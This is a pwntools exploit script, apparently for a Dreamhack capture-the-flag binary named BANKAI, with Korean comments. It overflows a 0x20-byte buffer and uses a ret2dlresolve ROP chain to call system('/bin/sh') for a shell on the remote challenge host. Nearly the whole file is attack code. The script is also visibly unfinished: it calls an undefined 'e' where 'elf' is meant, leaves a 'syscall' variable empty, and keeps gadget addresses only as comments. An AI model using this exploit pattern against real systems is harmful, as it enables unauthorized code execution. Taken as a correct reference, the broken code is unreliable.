from pwn import *

'''
BANKAI

도커파일 출처: pandas님의 velog * (https://velog.io/@rlajunwon/Info-Ubuntu-22.04-Docker-for-PWN)
'''

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

context.binary = elf = ELF('./prob')
libc = ELF("./libc.so.6")

def slog(n, a): return success(": ".join([n, hex(a)]))

HOST, PORT = "host8.dreamhack.games 1234".split()

rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh\x00"])

rop.read(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.DOCK:
    p = remote("localhost", 80)
else:
    p = elf.process(env={"LD_PRELOAD": "./libc.so.6"})

'''
   0x00000000001147d0 <+0>:     endbr64 
   0x00000000001147d4 <+4>:     mov    eax,DWORD PTR fs:0x18
   0x00000000001147dc <+12>:    test   eax,eax
   0x00000000001147de <+14>:    jne    0x1147f0 <read+32>
   0x00000000001147e0 <+16>:    syscall 
'''

# mov edi, 0x0 -> 0x40116b
# mov edx, 0x30 -> 0x401162
# pop rsi -> 0x401059
# mov eax, 0x0 -> 0x40109d
# lea rsi, [rbp-0x20] -> 0x401167

syscall = b''

slog("read@plt", e.plt["read"])
slog("read@got", e.got["read"])

pay = b'A'*0x20 # buf
pay += b'b'*0x8
pay += raw_rop

# 머리 터짐

pause()

# pause()
# gdb.attach(p)

p.send(pay)


p.interactive()